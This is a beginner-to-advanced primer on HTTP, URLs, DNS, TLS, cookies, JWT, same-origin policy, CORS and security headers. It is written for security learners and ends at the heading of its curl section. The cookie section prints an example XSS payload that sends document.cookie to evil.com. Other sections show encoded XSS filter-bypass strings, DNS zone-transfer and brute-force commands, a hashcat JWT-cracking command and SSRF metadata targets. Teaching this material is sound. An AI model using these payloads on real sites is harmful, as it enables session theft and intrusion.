<!--
Title: Zero-Knowledge Web Application & HTTP Primer
Volume: Volume 01 — Computer and Programming Foundations
Category: Zero-Knowledge Primer
Prerequisites:
  - Zero_Knowledge_Computer_Foundations_Master_Guide.md
  - Networking_Foundations_IP_Addressing_and_Subnetting_Master_Guide.md
Last Updated: 2026-09-05
-->

# Zero-Knowledge Web Application & HTTP Primer

> **Reading Time**: ~60 minutes | **Difficulty**: Beginner → Advanced

---

## Table of Contents

1. [What is the Web?](#1-what-is-the-web)
2. [HTTP Protocol Deep Dive](#2-http-protocol-deep-dive)
3. [URL Anatomy and Encoding](#3-url-anatomy-and-encoding)
4. [DNS — The Internet's Phone Book](#4-dns--the-internets-phone-book)
5. [HTTP Versions Compared](#5-http-versions-compared)
6. [HTTPS and TLS Handshake](#6-https-and-tls-handshake)
7. [Cookies — Anatomy and Security](#7-cookies--anatomy-and-security)
8. [Sessions vs JWT Tokens](#8-sessions-vs-jwt-tokens)
9. [Same-Origin Policy (SOP)](#9-same-origin-policy-sop)
10. [CORS — Cross-Origin Resource Sharing](#10-cors--cross-origin-resource-sharing)
11. [Web Application Architecture](#11-web-application-architecture)
12. [Browser DevTools for Security Testing](#12-browser-devtools-for-security-testing)
13. [Common Web Vulnerabilities Overview](#13-common-web-vulnerabilities-overview)
14. [HTTP Security Headers](#14-http-security-headers)
15. [Practical curl Commands](#15-practical-curl-commands)
16. [Summary](#16-summary)
17. [Next Steps](#17-next-steps)

---

## Prerequisites

Before reading this guide, ensure you understand:

- **Computer fundamentals**: [Zero_Knowledge_Computer_Foundations_Master_Guide.md](Zero_Knowledge_Computer_Foundations_Master_Guide.md)
- **Networking basics (IP, TCP/UDP)**: [Networking_Foundations_IP_Addressing_and_Subnetting_Master_Guide.md](../Volume_02_Linux_Networking_and_Security_Foundations/Networking_Foundations_IP_Addressing_and_Subnetting_Master_Guide.md)

---

## 1. What is the Web?

### Plain English Explanation

Imagine you walk into a library. You (the **client**) ask the librarian (the **server**) for a specific book (a **web page**). The librarian finds it and hands it to you. That is essentially how the World Wide Web works — except instead of a physical library, the exchange happens across a global network of computers communicating using agreed-upon rules called **protocols**.

The **World Wide Web** is a system of interlinked documents (web pages) hosted on computers called **web servers**, accessible via the internet using a standardised protocol: **HTTP** (HyperText Transfer Protocol).

### The Client-Server Model

```
                        THE CLIENT-SERVER MODEL

  +----------------+          Request           +--------------------+
  |                | --------------------->>--> |                    |
  |    CLIENT      |    GET /index.html          |    WEB SERVER      |
  |   (Browser)    |    Host: example.com        |   (Apache/Nginx)   |
  |                | <--<<---------------------- |                    |
  +----------------+          Response          +--------------------+
       Your PC               200 OK + HTML            example.com
    192.168.1.10             (over TCP:80/443)        93.184.216.34

         |                                                 |
         |               The Internet                      |
         +-------------------------------------------------+
                    (Routers, ISPs, DNS Servers)
```

**Key components:**

| Component | Role | Examples |
|-----------|------|---------|
| **Client** | Requests resources | Chrome, Firefox, curl, Burp Suite |
| **Server** | Hosts and serves resources | Apache, Nginx, IIS, Node.js |
| **Protocol** | Communication rules | HTTP, HTTPS |
| **Network** | Physical/logical path | Internet, LAN, Wi-Fi |

### What Happens When You Type a URL

1. You type `https://example.com/page` in your browser
2. Browser checks its **DNS cache** for the IP address
3. If not cached, browser queries a **DNS resolver** — gets back `93.184.216.34`
4. Browser opens a **TCP connection** to port 443 (HTTPS)
5. **TLS handshake** occurs — encrypted channel established
6. Browser sends an **HTTP GET request** for `/page`
7. Server processes the request and sends back an **HTTP response**
8. Browser **renders** the HTML, fetches CSS/JS/images (more HTTP requests)
9. Page is displayed

---

## 2. HTTP Protocol Deep Dive

### What is HTTP?

**HTTP (HyperText Transfer Protocol)** is a text-based, stateless, request-response protocol. It defines how clients ask servers for resources and how servers reply. "Stateless" means every request is independent — the server has no memory of previous requests unless state is explicitly managed (via cookies/sessions).

### HTTP Request Anatomy

```
GET /search?q=kali+linux&page=1 HTTP/1.1        <- Request Line
Host: www.example.com                            <- Headers start
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=abc123; theme=dark
Referer: https://www.google.com/
                                                 <- Blank line (CRLF)
                                                 <- Body (empty for GET)
```

**Breaking down each part:**

| Part | Example | Meaning |
|------|---------|---------|
| **Method** | `GET` | What action to perform |
| **Path** | `/search` | Which resource to access |
| **Query String** | `?q=kali+linux&page=1` | Additional parameters |
| **HTTP Version** | `HTTP/1.1` | Protocol version |
| **Host** | `www.example.com` | Which server to talk to (required in HTTP/1.1) |
| **User-Agent** | `Mozilla/5.0...` | What software the client is |
| **Accept** | `text/html...` | What content types the client accepts |
| **Accept-Encoding** | `gzip, deflate, br` | Supported compression methods |
| **Connection** | `keep-alive` | Keep TCP connection open for more requests |
| **Cookie** | `session_id=abc123` | Cookies stored for this domain |
| **Referer** | `https://www.google.com/` | Where the user came from |

### HTTP Response Anatomy

```
HTTP/1.1 200 OK                                  <- Status Line
Date: Sat, 05 Sep 2026 16:00:00 GMT             <- Headers start
Server: nginx/1.25.0
Content-Type: text/html; charset=UTF-8
Content-Length: 4821
Content-Encoding: gzip
Cache-Control: max-age=3600, public
Set-Cookie: session_id=xyz789; HttpOnly; Secure; SameSite=Strict
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
                                                 <- Blank line (CRLF)
<!DOCTYPE html>                                  <- Body (HTML content)
<html lang="en">
  <head><title>Example</title></head>
  ...
</html>
```

**Response headers explained:**

| Header | Purpose |
|--------|---------|
| `Date` | When the response was generated |
| `Server` | Web server software (can be fingerprinted!) |
| `Content-Type` | MIME type of the body |
| `Content-Length` | Size of body in bytes |
| `Content-Encoding` | How the body is compressed |
| `Cache-Control` | How the client/proxy should cache the response |
| `Set-Cookie` | Instructs client to store a cookie |
| `X-Frame-Options` | Prevents clickjacking |
| `Strict-Transport-Security` | Forces HTTPS (HSTS) |
| `X-Content-Type-Options` | Prevents MIME sniffing |

### HTTP Methods

| Method | Safe? | Idempotent? | Has Body? | Purpose |
|--------|-------|-------------|-----------|---------|
| **GET** | Yes | Yes | No | Retrieve a resource |
| **POST** | No | No | Yes | Submit data, create resource |
| **PUT** | No | Yes | Yes | Replace a resource entirely |
| **PATCH** | No | No | Yes | Partially update a resource |
| **DELETE** | No | Yes | No | Delete a resource |
| **HEAD** | Yes | Yes | No | Like GET but returns only headers |
| **OPTIONS** | Yes | Yes | No | Ask server what methods are allowed |
| **TRACE** | Yes | Yes | No | Echo back the request (diagnostic) |
| **CONNECT** | No | No | No | Establish a tunnel (used for HTTPS through proxy) |

> **Safe** = does not change server state. **Idempotent** = calling it multiple times has the same effect as calling once.

### HTTP Status Codes — Complete Reference

#### 1xx — Informational
| Code | Name | Meaning |
|------|------|---------|
| 100 | Continue | Server received headers, client should send body |
| 101 | Switching Protocols | Server agrees to protocol upgrade (e.g., WebSocket) |
| 102 | Processing | Server is processing (WebDAV) |

#### 2xx — Success
| Code | Name | Meaning |
|------|------|---------|
| 200 | OK | Standard success |
| 201 | Created | Resource created (POST success) |
| 202 | Accepted | Request accepted but not yet processed |
| 204 | No Content | Success but no body to return |
| 206 | Partial Content | Partial range request fulfilled |

#### 3xx — Redirection
| Code | Name | Meaning |
|------|------|---------|
| 301 | Moved Permanently | Resource permanently at new URL |
| 302 | Found | Temporary redirect |
| 303 | See Other | Redirect to GET after POST |
| 304 | Not Modified | Cached version is still valid |
| 307 | Temporary Redirect | Same as 302 but preserves method |
| 308 | Permanent Redirect | Same as 301 but preserves method |

#### 4xx — Client Errors
| Code | Name | Meaning |
|------|------|---------|
| 400 | Bad Request | Malformed request |
| 401 | Unauthorized | Authentication required |
| 403 | Forbidden | Authenticated but not authorised |
| 404 | Not Found | Resource does not exist |
| 405 | Method Not Allowed | HTTP method not supported |
| 408 | Request Timeout | Client took too long |
| 409 | Conflict | Request conflicts with server state |
| 410 | Gone | Resource permanently deleted |
| 413 | Payload Too Large | Body exceeds server limit |
| 415 | Unsupported Media Type | Content-Type not supported |
| 418 | I'm a teapot | Easter egg — RFC 2324 (used in CTFs!) |
| 429 | Too Many Requests | Rate limit exceeded |

#### 5xx — Server Errors
| Code | Name | Meaning |
|------|------|---------|
| 500 | Internal Server Error | Generic server-side failure |
| 501 | Not Implemented | Method not supported by server |
| 502 | Bad Gateway | Upstream server sent invalid response |
| 503 | Service Unavailable | Server overloaded or down |
| 504 | Gateway Timeout | Upstream server timed out |
| 505 | HTTP Version Not Supported | Server does not support HTTP version |

---

## 3. URL Anatomy and Encoding

### URL Structure Breakdown

```
https://user:pass@www.example.com:8443/path/to/page?key=val&foo=bar#section2
  |      |    |    |               |    |             |               |
  |      |    |    |               |    |             |               +-- Fragment
  |      |    |    |               |    |             +-- Query String
  |      |    |    |               |    +-- Path
  |      |    |    |               +-- Port (optional, 443 default for https)
  |      |    |    +-- Host (domain or IP)
  |      |    +-- Password (rare, appears in basic auth)
  |      +-- Username (rare)
  +-- Scheme (protocol)
```

| Component | Example | Notes |
|-----------|---------|-------|
| **Scheme** | `https` | Defines protocol |
| **Credentials** | `user:pass@` | Rarely used, security risk |
| **Host** | `www.example.com` | Domain or IP address |
| **Port** | `:8443` | Omitted if default (80/443) |
| **Path** | `/path/to/page` | Resource location |
| **Query String** | `?key=val&foo=bar` | Key-value pairs for filtering/searching |
| **Fragment** | `#section2` | Client-side only, never sent to server |

### URL Encoding

Special characters in URLs must be encoded because URLs only allow certain ASCII characters. **URL encoding** (percent encoding) replaces unsafe characters with `%XX` where XX is the hex ASCII code.

```
Space  ->  %20  (or + in query strings)
!      ->  %21
"      ->  %22
#      ->  %23
$      ->  %24
%      ->  %25
&      ->  %26
'      ->  %27
(      ->  %28
)      ->  %29
*      ->  %2A
+      ->  %2B
,      ->  %2C
/      ->  %2F
:      ->  %3A
;      ->  %3B
=      ->  %3D
?      ->  %3F
@      ->  %40
[      ->  %5B
]      ->  %5D
```

**Security relevance:** Attackers use URL encoding to bypass simple input filters. For example:

```
# Normal XSS (might be blocked)
<script>alert(1)</script>

# URL encoded (same payload)
%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Double encoded
%253Cscript%253E
```

### Base64 Encoding

**Base64** is not encryption — it is an encoding scheme that converts binary data to ASCII text using 64 characters (A-Z, a-z, 0-9, +, /). Used in HTTP Basic Auth, email attachments, JWT tokens.

```bash
# Encode
echo -n "admin:password123" | base64
# Output: YWRtaW46cGFzc3dvcmQxMjM=

# Decode
echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
# Output: admin:password123
```

> **Security note:** A `Authorization: Basic` header is just Base64-encoded credentials. Without HTTPS, they are trivially readable.

---

## 4. DNS — The Internet's Phone Book

### What is DNS?

**DNS (Domain Name System)** is a distributed, hierarchical database that translates human-readable domain names (like `google.com`) into IP addresses (like `142.250.80.46`). Without DNS, you would need to memorize IP addresses.

### DNS Resolution Chain — Step by Step

```
                        DNS RESOLUTION FLOW

  Browser Cache -> OS Cache -> /etc/hosts -> Recursive Resolver
       |              |           |               |
       | (miss)       | (miss)    | (miss)        |
       +--------------+-----------+               |
                                                   |
   +---------------------------------------------------+
   |                                               |    |
   |  Client                        +--------------+--+ |
   |  192.168.1.10                  | Recursive Resolver| |
   |       |                        | (ISP or 8.8.8.8) | |
   |       |                        +----------+-------+ |
   |       | 1. "Who is                        |         |
   |       |    example.com?"                  |         |
   |       |---------------------------------->|         |
   |       |                                   | 2. Ask Root Server
   |       |                        +----------+-------+ |
   |       |                        | Root Server (.)  | |
   |       |                        | "Ask .com TLD"   | |
   |       |                        +----------+-------+ |
   |       |                                   | 3. Ask .com TLD
   |       |                        +----------+-------+ |
   |       |                        | .com TLD Server  | |
   |       |                        | "Ask example NS" | |
   |       |                        +----------+-------+ |
   |       |                                   | 4. Ask Authoritative
   |       |                        +----------+-------+ |
   |       |                        | Authoritative NS | |
   |       |                        | ns1.example.com  | |
   |       |                        | "93.184.216.34"  | |
   |       |                        +----------+-------+ |
   |       |                                   | 5. Cache + Return
   |       |<----------------------------------|         |
   |       |  "93.184.216.34"                  |         |
   +---------------------------------------------------+
```

### DNS Record Types

| Record | Full Name | Purpose | Example |
|--------|-----------|---------|---------|
| **A** | Address | Maps domain to IPv4 | `example.com -> 93.184.216.34` |
| **AAAA** | IPv6 Address | Maps domain to IPv6 | `example.com -> 2606:2800::` |
| **CNAME** | Canonical Name | Alias one domain to another | `www -> example.com` |
| **MX** | Mail Exchange | Specifies mail server | `mail.example.com` (priority 10) |
| **TXT** | Text | Free-form text data | SPF, DKIM, domain verification |
| **NS** | Name Server | Specifies authoritative DNS server | `ns1.example.com` |
| **PTR** | Pointer | Reverse DNS (IP to domain) | `34.216.184.93.in-addr.arpa -> example.com` |
| **SOA** | Start of Authority | Zone metadata (primary NS, admin contact, TTL) | Zone master record |
| **SRV** | Service | Service location record | `_ldap._tcp.example.com -> dc1.example.com:389` |
| **CAA** | Cert Authority Authorization | Which CAs can issue certs | `0 issue "letsencrypt.org"` |

**Security relevance of DNS records:**
- **TXT records** often contain SPF/DKIM policies — misconfigured ones allow email spoofing
- **Zone transfers** (`AXFR`) can expose entire internal DNS structure if not locked down
- **PTR records** can reveal internal hostnames during reconnaissance

```bash
# Enumerate DNS records
dig example.com A
dig example.com MX
dig example.com TXT
dig example.com NS

# Try zone transfer (often fails on well-configured servers)
dig axfr @ns1.example.com example.com

# Reverse DNS lookup
dig -x 93.184.216.34

# Use nslookup
nslookup -type=TXT example.com

# DNS brute-force with dnsx
dnsx -d example.com -w /usr/share/wordlists/dns.txt
```

---

## 5. HTTP Versions Compared

| Feature | HTTP/1.0 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------|----------|----------|--------|--------|
| **Year** | 1996 | 1997 | 2015 | 2022 |
| **Connection** | One request per connection | Persistent (keep-alive) | Multiplexed (multiple streams) | Multiplexed over QUIC |
| **Transport** | TCP | TCP | TCP | UDP (QUIC) |
| **Header Compression** | None | None | HPACK | QPACK |
| **Multiplexing** | No | No (pipelining attempted) | Yes | Yes |
| **Server Push** | No | No | Yes | Yes |
| **Encryption** | Optional | Optional | Optional (all implementations use TLS) | Always TLS 1.3 |
| **Head-of-line blocking** | Yes | Yes | At TCP level | No |
| **Use today** | Rare | Still widespread | Growing | Growing (major sites) |

**Key improvements to understand:**

- **HTTP/1.1** added `Host` header (essential for virtual hosting), chunked transfer encoding, and persistent connections
- **HTTP/2** uses binary framing instead of text — more efficient but harder to read manually
- **HTTP/3** runs over **QUIC** (Quick UDP Internet Connections) — eliminates TCP head-of-line blocking

---

## 6. HTTPS and TLS Handshake

### What is HTTPS?

**HTTPS** = HTTP + **TLS** (Transport Layer Security). TLS wraps the HTTP connection in an encrypted tunnel. Without HTTPS, everything sent (including passwords, cookies, session tokens) travels as plaintext — visible to anyone between you and the server (ISP, router, coffee shop attacker).

### TLS Handshake — Step by Step

```
CLIENT                                          SERVER
  |                                               |
  |---- 1. ClientHello --------------------------->|
  |   TLS version: 1.3                            |
  |   Supported cipher suites                     |
  |   Random bytes (client_random)                |
  |   Supported key exchange methods              |
  |                                               |
  |<--- 2. ServerHello ----------------------------|
  |   Chosen cipher suite                         |
  |   Random bytes (server_random)                |
  |   Session ID                                  |
  |                                               |
  |<--- 3. Certificate ----------------------------|
  |   Server's X.509 certificate                  |
  |   (Contains server's public key)              |
  |                                               |
  |<--- 4. ServerHelloDone ------------------------|
  |                                               |
  |---- 5. ClientKeyExchange ---------------------->|
  |   Pre-master secret (encrypted with           |
  |   server's public key) OR                     |
  |   Diffie-Hellman key share                    |
  |                                               |
  |   [Both sides compute master secret]          |
  |   master_secret = PRF(pre_master,             |
  |                   client_random + server_random)
  |                                               |
  |---- 6. ChangeCipherSpec ----------------------->|
  |   "I'm switching to encrypted mode"           |
  |                                               |
  |---- 7. Finished (encrypted) ------------------>|
  |   Hash of all handshake messages              |
  |                                               |
  |<--- 8. ChangeCipherSpec -----------------------|
  |<--- 9. Finished (encrypted) ------------------|
  |                                               |
  |============ Encrypted HTTP Traffic ===========|
```

### TLS Handshake as Mermaid

```mermaid
sequenceDiagram
    participant C as Client (Browser)
    participant S as Server

    C->>S: ClientHello (TLS version, cipher suites, client_random)
    S->>C: ServerHello (chosen cipher suite, server_random)
    S->>C: Certificate (X.509 cert with public key)
    S->>C: ServerHelloDone
    C->>C: Verify certificate chain against trusted CAs
    C->>S: ClientKeyExchange (pre-master secret encrypted w/ server pubkey)
    C->>C: Derive master secret
    S->>S: Decrypt pre-master, derive master secret
    C->>S: ChangeCipherSpec
    C->>S: Finished (HMAC of all handshake messages)
    S->>C: ChangeCipherSpec
    S->>C: Finished (HMAC of all handshake messages)
    Note over C,S: Encrypted HTTP communication begins
```

### Certificate Chain and CA Hierarchy

```
+----------------------------------------------------------+
|                   ROOT CA                                 |
|   (DigiCert Root CA, Let's Encrypt ISRG Root X1)        |
|   Self-signed, stored in OS/browser trust store          |
|   Private key kept OFFLINE in HSM                        |
+---------------------------+------------------------------+
                            | Signs
                            v
+----------------------------------------------------------+
|               INTERMEDIATE CA                             |
|   (DigiCert TLS RSA SHA256 2020 CA1)                    |
|   Issues leaf certificates to website owners             |
|   Can be revoked without revoking root                   |
+---------------------------+------------------------------+
                            | Signs
                            v
+----------------------------------------------------------+
|               LEAF CERTIFICATE                            |
|   (*.example.com)                                        |
|   Contains: Subject, Public Key, SANs, Expiry            |
|   Installed on the web server                            |
+----------------------------------------------------------+
```

**Verifying a certificate:**

```bash
# View certificate details
openssl s_client -connect example.com:443 -showcerts 2>/dev/null | \
  openssl x509 -noout -text

# Check certificate expiry
echo | openssl s_client -servername example.com \
  -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# Check what cipher suite is negotiated
nmap --script ssl-enum-ciphers -p 443 example.com
```

---

## 7. Cookies — Anatomy and Security

### What is a Cookie?

A **cookie** is a small piece of data stored by the browser for a specific domain. The server sets cookies via `Set-Cookie` headers; the browser automatically sends them back via `Cookie` headers on subsequent requests to the same domain. Cookies enable **state** in an otherwise stateless HTTP protocol.

### Cookie Anatomy

```
Set-Cookie: session_id=a3f8b2e1d4c9;
            Domain=.example.com;
            Path=/;
            Expires=Sat, 05 Sep 2026 20:00:00 GMT;
            Max-Age=3600;
            Secure;
            HttpOnly;
            SameSite=Strict
```

| Attribute | Value | Meaning |
|-----------|-------|---------|
| **Name** | `session_id` | Cookie identifier |
| **Value** | `a3f8b2e1d4c9` | The actual data stored |
| **Domain** | `.example.com` | Which domains receive this cookie (`.` prefix = subdomains) |
| **Path** | `/` | Which URL paths send this cookie |
| **Expires** | `Sat, 05 Sep 2026...` | When cookie expires (absolute) |
| **Max-Age** | `3600` | TTL in seconds (relative) |
| **Secure** | (flag) | Only send over HTTPS |
| **HttpOnly** | (flag) | JavaScript cannot read this cookie (XSS protection) |
| **SameSite** | `Strict` | Controls cross-site sending |

### SameSite Attribute

| Value | Behaviour | CSRF Protection |
|-------|-----------|-----------------|
| `Strict` | Cookie NEVER sent on cross-site requests | Maximum |
| `Lax` | Cookie sent on top-level navigation GET only | Moderate (default in modern browsers) |
| `None` | Cookie sent on all requests (requires `Secure`) | None |

### Cookie Security Issues

**Cookie Theft via XSS:**
Without `HttpOnly`, JavaScript can read cookies:

```javascript
// Attacker's XSS payload
fetch('https://evil.com/steal?c=' + document.cookie);
```

**Session Fixation:**
1. Attacker gets a valid session ID from the server
2. Tricks victim into using that same session ID (via URL parameter)
3. Victim logs in — now both attacker and victim share the same authenticated session

**Session Hijacking:**
Attacker steals a victim's session cookie (via XSS, network sniffing, or log exposure) and uses it to impersonate them.

---

## 8. Sessions vs JWT Tokens

### Stateful Sessions (Traditional)

```
Client                                Server                  Database
  |                                     |                        |
  |---- POST /login (credentials) ----->|                        |
  |                                     |-- Create session ------>|
  |                                     |   session_id=XYZ        |
  |                                     |   user_id=42            |
  |<--- Set-Cookie: session_id=XYZ -----|                        |
  |                                     |                        |
  |---- GET /dashboard (Cookie:XYZ) --->|                        |
  |                                     |-- Lookup session_id --->|
  |                                     |<-- user_id=42 ---------|
  |<--- 200 OK (Dashboard) -------------|                        |
```

**Pros:** Easy to invalidate (just delete session from DB). Server has full control.
**Cons:** Requires server-side storage, harder to scale horizontally.

### Stateless JWT Tokens

**JWT (JSON Web Token)** encodes claims into a self-contained token that the server can verify without storing anything.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0MiwiZXhwIjoxNzU3MDk2MDAwfQ.xK9a2...
|-------------------------------------|---------------------------------------------------||------|
              Header (B64)                         Payload (B64)                           Sig
```

**Decoded:**

```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"user_id": 42, "role": "admin", "exp": 1757096000}

// Signature
HMACSHA256(base64(header) + "." + base64(payload), secret_key)
```

| Aspect | Sessions | JWT |
|--------|----------|-----|
| **Storage** | Server (DB/memory) | Client (localStorage/cookie) |
| **Revocation** | Instant (delete session) | Difficult (need blacklist) |
| **Scalability** | Harder (shared session store) | Easy (stateless) |
| **Size** | Small cookie (just ID) | Larger token |
| **Security** | Cookie theft | Token theft / alg confusion |

**JWT Vulnerabilities:**
- **`alg: none` attack**: Change algorithm to `none`, remove signature — some libraries skip verification
- **Algorithm confusion**: RS256 to HS256 attack using public key as HMAC secret
- **Weak secrets**: Brute-forceable with hashcat: `hashcat -a 0 -m 16500 token.txt wordlist.txt`

---

## 9. Same-Origin Policy (SOP)

### What is Same-Origin Policy?

The **Same-Origin Policy (SOP)** is a critical browser security mechanism that prevents JavaScript on one website from reading data from another website. Without SOP, a malicious site could silently make requests to your bank, read the responses, and steal your data.

**Origin** = Scheme + Host + Port

```
https://example.com:443/page  -> Origin: https://example.com:443

Compared to:
https://example.com/other     -> SAME ORIGIN   (port 443 default)
http://example.com/page       -> DIFFERENT (scheme)
https://sub.example.com/page  -> DIFFERENT (host)
https://example.com:8443/page -> DIFFERENT (port)
https://evil.com/page         -> DIFFERENT (host)
```

### What SOP Allows and Blocks

| Action | Allowed? |
|--------|---------|
| Reading responses from cross-origin fetch/XHR | Blocked |
| Embedding cross-origin img, script, iframe | Allowed |
| Sending cross-origin form POST | Allowed (no read) |
| Reading cross-origin iframe content | Blocked |
| Setting cross-origin cookies | Blocked |

---

## 10. CORS — Cross-Origin Resource Sharing

### What is CORS?

**CORS** is a browser mechanism that allows a server to explicitly permit cross-origin requests from specific origins. It relaxes SOP in a controlled way.

### Simple CORS Request

```
Client (evil.com) --> Server (api.example.com)

GET /api/user HTTP/1.1
Host: api.example.com
Origin: https://evil.com          <- Browser adds this automatically

Server response:
Access-Control-Allow-Origin: https://trusted.com  <- Only this origin allowed
```

If the `Origin` does not match, the browser blocks the JavaScript from reading the response (the request still went through!).

### Preflight Requests

For non-simple requests (POST with JSON body, custom headers, PUT/DELETE), the browser first sends an **OPTIONS preflight**:

```
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

Server response:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### CORS Misconfigurations

| Misconfiguration | Impact | Example |
|-----------------|--------|---------|
| Wildcard with credentials | Critical | `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` |
| Reflecting Origin header blindly | Critical | `ACAO: <value of Origin header>` |
| Trusting null origin | High | `ACAO: null` |
| Loose origin validation | High | Regex: `.*example.com` matching `evilexample.com` |

```mermaid
flowchart TD
    A["Browser makes cross-origin request"] --> B{Is it a simple request?}
    B -->|Yes| C[Send request with Origin header]
    B -->|No| D[Send OPTIONS preflight first]
    D --> E{Server allows preflight?}
    E -->|No| F[Browser blocks actual request]
    E -->|Yes| C
    C --> G[Server responds with ACAO header]
    G --> H{Does ACAO match request Origin?}
    H -->|No| I["Browser blocks JS from reading response"]
    H -->|Yes| J[JS can read the response]
```

---

## 11. Web Application Architecture

### MVC Pattern

**MVC (Model-View-Controller)** separates an application into three components:

```
+-------------+    User Input    +-----------------+
|    VIEW      | --------------> |   CONTROLLER    |
|  (HTML/CSS)  |                 |  (Business Logic)|
|              |<-- Render data -|                 |
+-------------+                 +--------+--------+
                                          |
                                  Read/Write Data
                                          |
                                 +--------v--------+
                                 |     MODEL       |
                                 |  (Database ORM) |
                                 +-----------------+
```

### REST vs SOAP vs GraphQL

| Aspect | REST | SOAP | GraphQL |
|--------|------|------|---------|
| **Protocol** | HTTP | HTTP/SMTP/etc | HTTP |
| **Data Format** | JSON/XML | XML only | JSON |
| **Endpoint Style** | Multiple URLs | Single endpoint | Single endpoint |
| **Typing** | Loose | Strong (WSDL) | Strong (Schema) |
| **Versioning** | URL/header | WSDL versions | Schema evolution |
| **Caching** | Native HTTP cache | Complex | Not natural |
| **Use Case** | Most modern APIs | Enterprise legacy | Flexible data fetching |
| **Security** | JWT/OAuth | WS-Security | Same as REST |

**Security considerations per API type:**
- **REST**: Test all CRUD operations, IDOR, broken object-level auth
- **SOAP**: Look for XXE in XML payloads, WSDL enumeration
- **GraphQL**: Introspection leaks schema, batching attacks, deeply nested queries (DoS)

---

## 12. Browser DevTools for Security Testing

### Network Tab

The **Network tab** is your window into every HTTP request the page makes.

```
How to use:
1. Press F12 -> Network tab
2. Reload the page (or perform an action)
3. Click any request to inspect:
   - Headers (request + response)
   - Preview (rendered response)
   - Response (raw body)
   - Cookies
   - Timing (waterfall)
```

**Security testing uses:**
- Find hidden API endpoints not visible in the UI
- Inspect authentication tokens in request headers
- See what parameters are sent (including hidden form fields)
- Identify content types that might accept injection
- Look for API responses that return more data than the UI shows (mass assignment)

### Console Tab

```javascript
// Read cookies (if not HttpOnly)
document.cookie

// Read localStorage (JWTs often stored here)
localStorage.getItem('token')

// Read sessionStorage
sessionStorage.getItem('user')

// Check Content Security Policy errors
// (CSP violations appear as red errors in console)
```

### Application Tab

- **Cookies**: View, edit, or delete cookies for the domain
- **Local Storage / Session Storage**: View key-value pairs stored by JavaScript
- **IndexedDB**: Browser-side database — can contain sensitive data
- **Service Workers**: Background scripts — check for cached sensitive responses

---

## 13. Common Web Vulnerabilities Overview

> This is a brief introduction. Each topic has a dedicated module.

| Vulnerability | Description | Relevant Module |
|---------------|-------------|-----------------|
| **XSS (Cross-Site Scripting)** | Injecting JavaScript into pages viewed by other users | [Module_21](../Volume_05_Web_Security_Foundations/Module_21_Web_Security_Foundations.md) |
| **SQL Injection** | Injecting SQL commands into database queries | [Module_30](../Volume_06_Web_Application_VAPT/Module_30_OWASP_Top_10_Deep_Dive.md) |
| **IDOR** | Accessing objects belonging to other users by changing IDs | [Module_30](../Volume_06_Web_Application_VAPT/Module_30_OWASP_Top_10_Deep_Dive.md) |
| **CSRF** | Tricking an authenticated user's browser into making unwanted requests | [Module_21](../Volume_05_Web_Security_Foundations/Module_21_Web_Security_Foundations.md) |
| **SSRF** | Making the server fetch internal/external URLs on attacker's behalf | [Module_30](../Volume_06_Web_Application_VAPT/Module_30_OWASP_Top_10_Deep_Dive.md) |

**Quick CSRF explanation:** CSRF exploits the fact that browsers automatically attach cookies to requests. If a malicious page makes a POST request to `bank.com/transfer`, the victim's browser will include their `bank.com` session cookie. CORS and SameSite cookies are the main defenses.

**Quick SSRF explanation:** If a web server fetches URLs on user request (e.g., import from URL, webhook), an attacker can supply `http://169.254.169.254/` (AWS metadata) or `http://localhost/admin` to access internal services.

---

## 14. HTTP Security Headers

Security headers are server-sent HTTP response headers that instruct browsers to enable or disable security features.

```bash
# Check security headers
curl -s -I https://example.com | grep -i -E "strict|content-security|x-frame|x-content|referrer|permissions"
```

### Content Security Policy (CSP)

**CSP** tells the browser which sources of content (scripts, styles, images) are trusted. It is the primary defense against XSS.

```
Content-Security-Policy: default-src 'self';
                         script-src 'self' https://cdn.example.com;
                         img-src *;
                         style-src 'self' 'unsafe-inline';
                         frame-ancestors 'none';
                         report-uri /csp-violations
```

| Directive | Meaning |
|-----------|---------|
| `default-src 'self'` | Default: only load from same origin |
| `script-src 'self' cdn.example.com` | Scripts only from these sources |
| `'unsafe-inline'` | Allows inline scripts — **weakens CSP significantly** |
| `'unsafe-eval'` | Allows `eval()` — **dangerous** |
| `frame-ancestors 'none'` | Prevents page from being embedded in iframes (clickjacking) |
| `report-uri /path` | Where to send violation reports |

### HSTS — HTTP Strict Transport Security

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Directive | Meaning |
|-----------|---------|
| `max-age=31536000` | Remember to only use HTTPS for 1 year |
| `includeSubDomains` | Apply to all subdomains |
| `preload` | Submit to browsers' hardcoded HSTS list |

### X-Frame-Options

```
X-Frame-Options: DENY          <- Never allow framing
X-Frame-Options: SAMEORIGIN    <- Only allow framing from same origin
```

Prevents **clickjacking** attacks where attacker overlays invisible iframe.

### X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

Prevents browsers from **MIME-sniffing** — guessing content type. Without this, a server that allows HTML uploads could serve a `.jpg` file as HTML and execute scripts.

### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```

| Value | Behavior |
|-------|---------|
| `no-referrer` | Never send Referer header |
| `same-origin` | Only send to same origin |
| `strict-origin-when-cross-origin` | Full URL for same-origin, only origin for cross-origin |
| `unsafe-url` | Always send full URL (leaks private paths) |

### Permissions-Policy

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

Controls which browser features (camera, mic, GPS) the page can use.

---

## 15. Practical curl Commands

**curl** is the Swiss Army knife of HTTP requests from the command line.

